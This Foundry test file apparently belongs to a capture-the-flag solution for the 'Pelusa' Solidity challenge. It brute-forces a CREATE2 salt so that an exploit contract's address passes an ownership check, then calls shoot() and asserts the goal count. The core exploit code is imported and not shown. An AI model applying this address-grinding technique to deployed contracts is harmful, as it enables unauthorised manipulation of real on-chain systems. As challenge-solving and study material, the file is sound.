// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PelusaExploit.sol";

contract PelusaTest is Test {
    Pelusa pel;
    PelusaExploit expl;

    address pelusaDeployer = makeAddr("pelusaDeployer");
    address attacker = makeAddr("attacker");

    function testFindCreate2Salt() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        for (uint256 i; i < 1000; ++i) {
            vm.expectRevert();
            emit log_uint(i);
            expl = new PelusaExploit{
                salt: bytes32(uint256(i))
            }(pel, pelusaDeployer, blockhash(block.number));
        }
    }

    function testExploit() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        /* In a real world scenario, an attacker is able to retrieve the deployer's address and the block.number at which the Pelusa
        contract was deployed, effectively reconstructing the `owner` address and passing the `isGoal()` check.
        */
        expl = new PelusaExploit{
            salt: bytes32(uint256(39)) // salt value 39 was found by brute forcing the create2 address pre computation in the above test
        }(pel, pelusaDeployer, blockhash(block.number));
        pel.shoot();
        vm.stopPrank();

        assertEq(pel.goals(), 2);
    }
}
